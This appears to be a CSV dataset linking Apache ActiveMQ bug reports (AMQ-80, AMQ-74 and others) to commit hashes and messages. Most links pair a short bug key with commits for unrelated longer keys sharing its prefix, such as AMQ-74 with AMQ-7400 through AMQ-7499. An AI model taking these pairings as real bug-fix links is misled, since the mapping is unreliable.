bug id,bug key,bug description,commit hash,commit msg
12481231,AMQ-80,"Started the server with:
 maven server -Dconfig=src\sample-conf\jdbm-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true

Expected the consumer to receive the 10 message published by the producer but it did not receive any.",07529a5f05cc3940c0ce0c73aecdf26959b983bf,"AMQ-801: Bundle activemq-jaas with dsitro

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@469670 13f79535-47bb-0310-9956-ffa450edef68"
12481231,AMQ-80,"Started the server with:
 maven server -Dconfig=src\sample-conf\jdbm-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true

Expected the consumer to receive the 10 message published by the producer but it did not receive any.",3218a93ba2a76244225833cf4b6d3874886c84ae,[AMQ-8090] Add a release validation script
12481231,AMQ-80,"Started the server with:
 maven server -Dconfig=src\sample-conf\jdbm-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true

Expected the consumer to receive the 10 message published by the producer but it did not receive any.",0146d5eb3e69e086ec19df1df1b2b7966c644d26,[AMQ-8060] Re add allowLinkStealing on transport connector for backward compatibility
12481231,AMQ-80,"Started the server with:
 maven server -Dconfig=src\sample-conf\jdbm-example.xml

Then published some messages with:
 maven producer -Dtopic=false -Ddurable=true

Restarted the server and then ran the consumer with:
 maven consumer -Dtopic=false -Ddurable=true

Expected the consumer to receive the 10 message published by the producer but it did not receive any.",9b6a48ad31b2fb4b3a5a129d4ed6119024c6850a,[AMQ-8032] Add JAXB in lib by default to avoid issue with JDK11
12481492,AMQ-77,"we should be able to use an embedded broker in an ActiveMQConnectionFactory and use any URL to connect to it; yet there seems a bug somewhere.

e.g. if I use

factory.brokerURL = ""tcp://localhost:62001""

and use a Spring embedded broker container factory, we get a socket in use.

Is it trying to make 2 brokers maybe?",d3d58fe41d2e946f87abcbf1001be51e18749075,"Test case and Fix for https://issues.apache.org/activemq/browse/AMQ-777


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@587216 13f79535-47bb-0310-9956-ffa450edef68"
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,b7dca5e0738639f2bffe7f97b9c782372fc2188e,[AMQ-7400] Fix OSGi statement about sun.rmi
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,e6befbc8750127d3f1a0a36eec91507b57aef2ab,AMQ-7404 add debug logging for selectors loaded from the cache file
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,1f2e9be784fb0dc20fe48be2a9a35946446641d7,AMQ-7411 - Avoid leaking Hadoop test dependency
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,ae96af6d0fb75669cfa056ddfa6502ecf44270b3,"[AMQ-7409] Exclude netty from zookeeper dependency

Credit To: Piyush Chugh <chughpiyush>"
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,cb23db5c5deb33b2201ba5aa13847d470c2317de,[AMQ-7429] Align spring-expression version with other spring artifacts
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,910a028fa7dd9659044f4e44392197830d9b463e,[AMQ-7476] Add http schema in the HTTP registry
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,a7b06c043c34978125b57016a8bd82d9bb2fa6a5,AMQ-7497 - tidy up test cleanup for random order runs
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,8cc5386fbbe7a836ac9aef3cffcb56c0b9f65adc,AMQ-7497 - further test to verify behaviour after ra.stop
12481137,AMQ-74,We should clone() the object on createObjectMessage() to avoid any possible issues due to the mutation of the object between the sending of the message and the creation of the ObjectMessage,071edf522e0fb82779c01e97479f48bf48493f66,AMQ-7499 add pause/resume operation of a queue in web console
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",3fc05469369e4e7296197690d847041762a06f6a,"Applied John Sission's patch: https://issues.apache.org/activemq/browse/AMQ-705 Thanks John!

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@399701 13f79535-47bb-0310-9956-ffa450edef68"
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",46160c7b7f66d9d5dda05d2e2dc45e993d3cc48e,[AMQ-7011] Override dispatch to always set dispatchAsync true
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",063d21f88062a09b7efc1669608cbbacdeb11aac,[AMQ-7013] Adding unit test
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",b6dae3703e358de990bda91fcdf5fdbc6a75545f,[AMQ-7023] Add owasp plugin as profile to AMQ build.
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",7974e8c0991dd0bcf2e226ea9b54ff8d740acfc8,AMQ-7004 - Improved logging in Failover Transport
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",8f88dcda09760df3aba3306f49a3311fb22a654f,"AMQ-7055 - Optimization on SequenceSet to prevent iterating through the whole set when a value bigger than the last value is added

Signed-off-by: gtully <gary.tully@gmail.com>"
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",8e5d539665519629139633e324a672b0a415d4b2,AMQ-7067 - add missing license header
12481166,AMQ-70,"We should use a single consumer per queue to make it easier to load balance message consumption on queues across many HTTP requests.

The current code base of 1 consumer per HTTP sessions only really works well for topics",daea192eefe683a8cba63b5136dc8c2b39722cfe,"AMQ-7085 - Properly start TempUsage inside Queue start

This fix allows temp usage changes to the broker temp usage to propagate
properly to a Queue's temp usage settings

Patch applied with thanks to David Sitsky"
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",b6cb0eacea632239fa6bf3a6c66ba1570c3c9af7,"[AMQ-6702] add maxProducersToAudit and maxAuditDepth to dead letter strategy to cofigure the audit, fix and test"
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",99f3d4c5054bbf401c6460d99574873b604e4b49,"[AMQ-6703] have jmx purge clear the audit such that messages can be copied back, fix and test"
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",56bed30c6427a1cc6b41e0d289a97c3e5b4582c4,"AMQ-6765 Add trace logging of start failure exception

Log the exception at trace level when start fails."
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",8646bb1010d2632f5d405fe1761c2b9c99a0a139,[AMQ-6788] Explain how to fix the problem in the exception
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",63f0b7e20d56837b4f159e83594a4e4fb906cd4a,[AMQ-6792] fire the failover exception handler before stop to ensure blocked write does not block stop request
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",35bd3ad938f5c378b17a34980d2f3480bf3bbfc3,"AMQ-6798 - Clean up store usage object on Queue stop

When queues are stopped the StoreUsage object needs to be stopped so it
will be removed from the parent StoreUsage.  This allows the object to
be garbage collected and prevents a memory leak."
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",33b52b5914b30e73663a344f095a30c1dd484f49,[AMQ-6790] add netty kqueue osgi dependency to the activemq-amqp-client feature
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",e5b7c9fba467d1b9f2db04c01e3863883fd25fc0,"AMQ-6821, AMQ-6790: add the ActiveMQAMQPBrokerFeatureTest to the smoke/sanity test profile"
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",314d5a51688186bf1a21bae0137b3e6cee407f43,AMQ-6707 - skip tracked ack dependent test for leveldb
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",46f8deeb67623e095622debac18f53d736cb3bcc,[AMQ-6780] Add PostgreSQL version JDBC driver name in jdbc store services
12481326,AMQ-67,"The source download http://dist.codehaus.org/activemq/distributions/activemq-1.0-src.zip does not build.

java:compile:
    [echo] Compiling to C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1
.0/target/classes
    [javac] Compiling 368 source files to C:\dev\projects\org.codehaus\activemq-
1.0-src\activemq-1.0\target\classes
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:9: package org.codehaus.activemq.router.f
ilter does not exist
import org.codehaus.activemq.router.filter.*;
^
C:\dev\projects\org.codehaus\activemq-1.0-src\activemq-1.0\src\java\org\codehaus
\activemq\selector\SelectorParser.java:22: cannot resolve symbol
symbol  : class Filter
location: class org.codehaus.activemq.selector.SelectorParser
    public Filter parse(String sql) throws InvalidSelectorException {


http://dist.codehaus.org/activemq/distributions/activemq-1.0-SNAPSHOT-src.tar.gz   
builds correctly however.",dc36c19c811dcaab07c27d6f2a0dcdd90f856d3f,[AMQ-6780] This closes #311
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",e1bdb1d89be0754a27c8fd27707c075fdd2f7ccf,"temporarily disabled a test case (AMQ-583) until we can verify it works on all platforms

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@379074 13f79535-47bb-0310-9956-ffa450edef68"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",5fbce8982c7c94ff4f22c995336e294f9d71fd91,"disabled test due to AMQ-583

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@382359 13f79535-47bb-0310-9956-ffa450edef68"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",df06bdabdc0e9f892449e0ef0d8783aea6047802,"https://issues.apache.org/jira/browse/AMQ-5816

Apply patch from Ievgen Tarasov that ensures that the data locator is
initialized when a MessageId is deserialized."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",732fd5684017cd585bfb418950a03ec9a6f44e49,"https://issues.apache.org/jira/browse/AMQ-5839

Disable failing test, broker doesn't currently recover the noLocal state
for a durable subscription."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",c2310391b9feab44bfaa46e93f0e4ca90d5bf357,"https://issues.apache.org/jira/browse/AMQ-5845

provide server information in connection properties."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",ffef4dc5fa68cd0e02f4850582fb09db381394da,https://issues.apache.org/jira/browse/AMQ-5844 - patch and test applied with thanks to Ganesh Murthy - ganeshmurthy
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",d919db5e3d8f453c173f6ed82b1e0bce3b3df5fb,"https://issues.apache.org/jira/browse/AMQ-5804

Apply patch from Pavlo Vasylchenko"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",97b0619b26947c9170230e6969df13116f4a2463,[AMQ-5858] add import package
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",46055034c949c7fbce717c93f5d94b4ca18dd23b,"https://issues.apache.org/jira/browse/AMQ-5837

This commit adds an Inflight message size statistic to SubscriptionStatistics
so we can know the size of all the messages that are inflight, besides just the count."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",ff9aae69f9da93e2b7500557649a512dddb94dca,"https://issues.apache.org/jira/browse/AMQ-5876 

Add missing license headers to the properties files."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",de5d0d9430838948196f573c5278c75fbee9f25e,"https://issues.apache.org/jira/browse/AMQ-5854

Fix intermittent test failure caused by the test reconnecting before
the failure assertion had a chance to assert the expected failure"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",95f58fa7c4e26b5b2d73a80bd8e1cb2bee8ebf47,"https://issues.apache.org/jira/browse/AMQ-6027

Adding back in test case now that AMQ-5898 is resolved"
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",c530b69e16372232bef19dcd353cbe91e4a511d2,"https://issues.apache.org/jira/browse/AMQ-5881

Fail the connect if the password is set but the username bit is not as
per the V3.1.1 spec requirements."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",1b38b27ed23a5ac604e5a4dd509dd854afdfde07,"https://issues.apache.org/jira/browse/AMQ-5882

Fail to publish if the topic name in the publish packet contains a wild
card character as per the MQTT V3.1 and V3.1.1 spec."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",8ef44452a24685dea52b0757960c1a750abd4246,"https://issues.apache.org/jira/browse/AMQ-5880

Adds a test for the issue that is ignored for now while we wait for a
fixed MQTT client release."
12481281,AMQ-58,"Thanks to Charles Anthony for spotting this one.

It seems on the server side that as a connection closes, we get a 'closed client' log message. Then when the JVM finishes, we get another close message.

Sounds like we're keeping around the connection?",dc68ad89678eba9d18184f1a5342eb7ecf774596,[AMQ-5875] add queue test variant to validate shared mkahaDb remains when one dest is deleted
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,05f6cd6cfc9db677df89fe470f4c3a58bc036d5f,ignore intermittent failures for 5.11 - leveldb can be a focus for 5.12 - https://issues.apache.org/jira/browse/AMQ-5512
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,3e007d89a27f4c74d33862b9967676c683faec51,[AMQ-5514] Add the 5.10.1 release to the spring.schemas file.
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,6466ae2bcfa8831d79f71e94709b0511dc1367cf,"AMQ-5519: use the NOT_FOUND error condition when failing to find a DurableSubscription

https://issues.apache.org/jira/browse/AMQ-5519"
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,f4eade2bb3bb83131f17d2768d2218770f0123d3,[AMQ-5520] Use a network interface that actually supports multicast and is up
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,548aa1e41557f00f894fe160219bd155464f6c06,"https://issues.apache.org/jira/browse/AMQ-5525 - worked around the issue with blueprint converter - all. All of the activemq commands have the same single arg signature, so the conversion should be trivial, doing the conversion inline in the default case"
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,de549f8926988ab436084225cdcd6595f1657262,https://issues.apache.org/jira/browse/AMQ-5535 - allow close state reporting w/o contention
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,1c72579d7a0017bd22e800e47d34e3f748601a9a,"https://issues.apache.org/jira/browse/AMQ-5598

Parallel connection test, could not reproduce issue."
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,55f040e616899262d19c2bd1178826a65359516c,https://issues.apache.org/jira/browse/AMQ-5568  - ensure directory exists - fix ci
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,b5856501975ddaeb409c1d1e18e3421575643e8b,https://issues.apache.org/jira/browse/AMQ-5558 - deprecate old ant-based examples
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,59958ad2699f70788759b632c8f758568795530a,https://issues.apache.org/jira/browse/AMQ-5552 - exclude two tests that show intermittent failures in ci
12481360,AMQ-53,<NA>,acf84b43e9b7c8aaf92784569075f00e83cf4809,https://issues.apache.org/jira/browse/AMQ-5304 - providing test case
12481360,AMQ-53,<NA>,6bdce73d838abccd8495c979c45bbff8a8bdfc5f,https://issues.apache.org/jira/browse/AMQ-5304 - ignore the test for now
12481360,AMQ-53,<NA>,98f707bd1e733821a02e13b6ae0fe9bc8a0ed9b0,https://issues.apache.org/jira/browse/AMQ-5304 - still missing unit test case
12481360,AMQ-53,<NA>,c391321d1b5b59542d847717654b0d4dba54cf2f,"https://issues.apache.org/jira/browse/AMQ-5315

Fix for potential NPE on transport error."
12481360,AMQ-53,<NA>,7ca25965db5b9ffdfba11b914dafbb36a3504162,added CamelRoutesBrokerPlugin for https://issues.apache.org/jira/browse/AMQ-5351
12481360,AMQ-53,<NA>,2d9475c4f022d3fbf498692f1bb64841d30feb35,"https://issues.apache.org/jira/browse/AMQ-5346

Apply patch for link detach event from @gemmellr"
12481360,AMQ-53,<NA>,74d2c2425fbcbdf38f910f3c321d89780ba2ab6c,"https://issues.apache.org/jira/browse/AMQ-5390

Adds a test case to show that things work as expected."
12481360,AMQ-53,<NA>,162f9fc5590b1403fb4e9b1fb23d249929d8bc62,"https://issues.apache.org/jira/browse/AMQ-5391: offer the ANONYMOUS-RELAY connection capability to
 signal support for the anonymous relay"
12481360,AMQ-53,<NA>,a095e9b9ddc32b7bd47ec2482725f2ccf5300d54,"https://issues.apache.org/jira/browse/AMQ-5310

Adding tests that validate the code follows the JMS Spec expectations
for behavior of closed consumers and producers."
